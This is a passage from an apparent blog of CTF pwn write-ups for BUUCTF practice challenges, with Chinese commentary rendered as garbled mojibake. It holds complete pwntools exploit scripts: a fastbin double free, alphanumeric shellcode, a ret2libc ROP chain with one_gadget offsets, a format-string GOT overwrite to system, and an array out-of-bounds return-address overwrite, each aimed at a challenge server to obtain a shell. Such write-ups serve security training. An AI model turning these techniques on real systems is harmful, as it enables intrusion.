class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./gyctf_2020_some_thing_exceting&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26961</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ba_length,ba_content,na_length,na_content</span>):<br>        sla(<span class="hljs-string">&#x27;&gt; Now please tell me what you want to do :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;&gt; ba\&#x27;s length : &#x27;</span>,<span class="hljs-built_in">str</span>(ba_length))<br>        sa(<span class="hljs-string">&#x27;&gt; ba : &#x27;</span>,ba_content)<br>        sla(<span class="hljs-string">&#x27;&gt; na\&#x27;s length : &#x27;</span>,<span class="hljs-built_in">str</span>(na_length))<br>        sa(<span class="hljs-string">&#x27;&gt; na : &#x27;</span>,na_content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;&gt; Now please tell me what you want to do :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;&gt; Banana ID : &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;&gt; Now please tell me what you want to do :&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;&gt; Banana ID : &gt; SCP project ID : &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment">#------------------------------------------------------</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#1</span><br>addr=<span class="hljs-number">0x602098</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,p64(addr))<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27; &#x27;</span>)<br>show(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-shellcode-revenge">mrctf2020_shellcode_revenge</h3><p>å‚è€ƒå¸ˆå‚…ï¼š[<a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">BUUCTF]PWNâ€”â€”mrctf2020_shellcode_revengeï¼ˆå¯è§å­—ç¬¦shellcodeï¼‰_mcmuyangaçš„åšå®¢-CSDNåšå®¢</a></p><p>è¿™é¢˜idaï¼Œf5æ— æ³•åæ±‡ç¼–ï¼ŒæŠ¥é”™åœ¨124Då¤„</p><p>æŒ‰g ï¼Œè¾“å…¥åœ°å€jumpåˆ°é‚£é‡Œå‘ç°æ˜¯call raxï¼Œè€Œraxä¸bufæœ‰å…³ï¼Œçœ‹æ±‡ç¼–ä»£ç å‘ç°bufæ˜¯readå‡½æ•°æˆ‘ä»¬å¯ä»¥è¾“å…¥çš„æ•°æ®</p><p>è¿™é¢˜ä¹Ÿæ²¡å¼€nxï¼Œæˆ‘ä»¬åœ¨bufé‡Œå¡«shellï¼Œæœ€åå°±ä¼šcall shellï¼Œ</p><p>ä½†ä¸Šé¢è¿˜æœ‰ä¸€äº›åˆ¤æ–­æ¡ä»¶ï¼š</p><p>readå‡½æ•°è¿”å›å€¼ï¼Œä¹Ÿå°±æ˜¯eaxï¼Œæ˜¯è¯»å…¥çš„bufé•¿åº¦ï¼Œå­˜å…¥[rbp+var_8]</p><p>å³[rbp+var_8]=lenï¼ˆbufï¼‰</p><p>1.ä¸0æ¯”è¾ƒï¼Œæˆ‘ä»¬è¦ä½¿ä»–é•¿åº¦&gt;0</p><p>[rbp+var_4]=0</p><p>2.å†ä¸0æ¯”è¾ƒï¼Œè¦ä½¿ä»–é•¿åº¦&lt;0</p><p>è¿™ä¸æ˜¯çŸ›ç›¾äº†ä¹ˆ</p><p>ç„¶åå‘ç°ç¨‹åºæœ‰å¦ä¸€æ¡è·¯ï¼Œç»•ä¸€åœˆè¿˜èƒ½æ‰§è¡Œåˆ°è¿™ä¸ªåˆ¤æ–­è¯­å¥</p><p>cdqeä½¿ç”¨eaxçš„æœ€é«˜ä½æ‹“å±•raxé«˜32ä½çš„æ‰€æœ‰ä½<br>movzxåˆ™æ˜¯æŒ‰æ— ç¬¦å·æ•°ä¼ é€+æ‰©å±•ï¼ˆ16-32ï¼‰</p><p>EAXæ˜¯32ä½çš„å¯„å­˜å™¨ï¼Œè€ŒAXæ˜¯EAXçš„ä½16ä½,AHæ˜¯axçš„é«˜8ä½ï¼Œè€ŒALæ˜¯axçš„ä½8ä½<br>å¤§è‡´å°±æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²æ¯ä¸€ä½è¿›è¡Œæ¯”è¾ƒï¼Œ</p><p>èŒƒå›´æ˜¯ï¼ˆ0x60ï¼Œ0x7aï¼‰ï¼ˆ0x2f,0x5aï¼‰è¿™äº›èŒƒå›´çš„å­—ç¬¦æ˜¯</p><p>string.printableï¼Œå°±æ˜¯å¯è§å­—ç¬¦shellcodeã€‚è¿™é‡Œä½¿ç”¨alpha3å¸®åŠ©æˆ‘ä»¬ç”Ÿæˆ</p><p>è¿™ä½å¸ˆå‚…ï¼š<a href="http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode">çº¯å­—ç¬¦shellcodeç”ŸæˆæŒ‡å— | TaQini</a></p><p>ç›´æ¥ä¸‹è½½TaQiniå¸ˆå‚…ä¿®æ”¹çš„ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/TaQini/alpha3.git<br></code></pre></td></tr></table></figure><p>ç›´æ¥ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./shellcode_x64.sh rax<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25803</span>)<br>sc=<span class="hljs-string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span><br>r.send(sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-brop64">axb_2019_brop64</h3><p>ç›´æ¥let2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./axb_2019_brop64&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29428</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br>pop_rdi=<span class="hljs-number">0x400963</span><br>repeater=<span class="hljs-number">0x400845</span><br>ru(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(repeater))<br>puts_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br>libc_base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>og=libc_base+<span class="hljs-number">0x45216</span><br>ru(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(og))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="inndy-echo">inndy_echo</h3><p>32ä½æ ¼å¼åŒ–å­—ç¬¦ä¸²æ”¹å†™strcmp_gotä¸ºsystemï¼Œå†å¡«å…¥binsh</p><p>32ä½ç›´æ¥ç”¨payload=fmtstr_payload(offset,{strcmp_got:system})</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./echo&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28185</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br>offset=<span class="hljs-number">7</span><br>strcmp_got=elf.got[<span class="hljs-string">&#x27;strcmp&#x27;</span>]<br>system=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload=fmtstr_payload(offset,&#123;strcmp_got:system&#125;)<br>sl(payload)<br>sl(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-name-your-cat">wustctf2020_name_your_cat</h3><p>æ•°ç»„è¶Šç•Œ</p><p>å¯ä»¥ç›´æ¥è·³è‡³ret</p><p>è¯´ä¸€ä¸‹ä¸ºä»€ä¹ˆè¦å¾ªç¯å››æ¬¡:</p><p>æˆ‘ä»¬æ”¹çš„æ˜¯vulnerableçš„retï¼Œä»–è¦retçš„è¯ï¼Œè¦ç»“æŸ5ä¸ªå¾ªç¯ï¼Œæ‰€ä»¥å…ˆå¡«4ä¸ªå¾ªç¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./wustctf2020_name_your_cat&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29315</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br>backdoor=<span class="hljs-number">0x80485cb</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>        sla(<span class="hljs-string">&#x27;Give your name plz: &#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Give your name plz: &#x27;</span>,p32(backdoor))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wdb2018-guess">wdb2018_guess</h3><p><strong>stack smashingâ€“canaryæŠ¥é”™åˆ©ç”¨</strong>,æœ¬é¢˜å› ä¸ºæœ‰forkï¼Œæœ‰ä¸‰æ¡å‘½ï¼Œä¸ç„¶æ­£å¸¸æ¥è®²æŠ¥é”™å°±ç»“æŸè¿›ç¨‹äº†</p><p>å‚è€ƒå¸ˆå‚…ï¼š[<a href="https://blog.csdn.net/mcmuyanga/article/details/114789897?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=wdb2018_guess&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-114789897.nonecase&amp;spm=1018.2226.3001.4187">BUUCTF]PWNâ€”â€”wdb2018_guessï¼ˆstack smashingâ€“canaryæŠ¥é”™åˆ©ç”¨ï¼‰_mcmuyangaçš„åšå®¢-CSDNåšå®¢</a></p><p>å…ˆvim ./wdb2018_guess è¾“å…¥/alarmï¼ŒæŠŠå®ƒæ”¹ä¸ºisnan</p><p>æ–¹ä¾¿æˆ‘ä»¬æœ¬åœ°è¿è¡Œ</p><p>fork()åˆ›å»ºå­è¿›ç¨‹</p><p>wait()ä¼šæš‚æ—¶åœæ­¢ç›®å‰è¿›ç¨‹çš„æ‰§è¡Œ, ç›´åˆ°æœ‰ä¿¡å·æ¥åˆ°æˆ–å­è¿›ç¨‹ç»“æŸ.</p><p><strong>å…·ä½“æ­¥éª¤ï¼š</strong></p><p><strong>1.ç¬¬ä¸€æ¡å‘½ï¼Œæ³„éœ²puts_got</strong></p><p>gdbè°ƒè¯•å¾—åˆ° 